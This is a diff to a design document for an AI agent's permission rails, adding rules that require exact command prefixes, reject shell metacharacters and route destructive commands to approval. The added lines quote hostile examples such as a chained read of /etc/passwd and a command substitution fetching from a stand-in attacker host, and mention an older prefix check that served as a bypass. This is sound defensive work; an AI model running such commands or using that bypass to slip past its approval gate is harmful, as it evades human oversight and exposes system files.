@@ -35,6 +35,8 @@ Deterministic rails over `tool_name` + `tool_input`. Fail-safe on unknown tools 
 - Tool names: `Read`, `Grep`, `Glob`, `WebSearch`, `WebFetch`, `TodoWrite`, `TaskCreate` / `TaskUpdate` / `TaskList` / `TaskGet`.
 - Bash prefixes: `git status/diff/log/show/branch/ls-files/rev-parse/config --get/ls-remote/remote -v`, `ls`, `cat`, `pwd`, `wc`, `head`, `tail`, `find `, `which `, `printf`, `node -v`, `node --version`, `npm -v`, `npm --version`, `npx tsc --noEmit`, `npx tsc --version`, `grep `, `rg `, `gh pr list/view`, `gh issue list/view`, `gh run list/view`.
 - Bash psql: only `psql -c 'SELECT …'` with no semicolon-separated second statement.
+- Bash whole-command rules: (1) the whole command must be `prefix` alone OR start with `prefix ` (space required — a loose `startsWith(prefix)` was the old bypass vector); (2) the command must contain NO shell metacharacters — `;`, `&`, `|`, `` ` ``, `$`, `<`, `>`, `\n`, or `$(` fail-close the check. `ls; rm -rf /tmp`, `ls && cat /etc/passwd`, and `cat "$(curl attacker)"` all reject.
+- Destructive-rail override: a command that matches the destructive rail (`rm -rf`, `git branch -D`, `git reset --hard`, `DROP TABLE`, `TRUNCATE`, `supabase db reset`, `vercel … --prod`, etc.) is ALWAYS routed to `needs_approval` `risk='destructive'` — even if a prefix in the allowlist would otherwise cover it. Belt-and-suspenders against a novel destructive shape that slips into an allowlisted prefix.
 
 ### Destructive (needs approval, risk='destructive' → Phase-3 PIN gate applies)
 
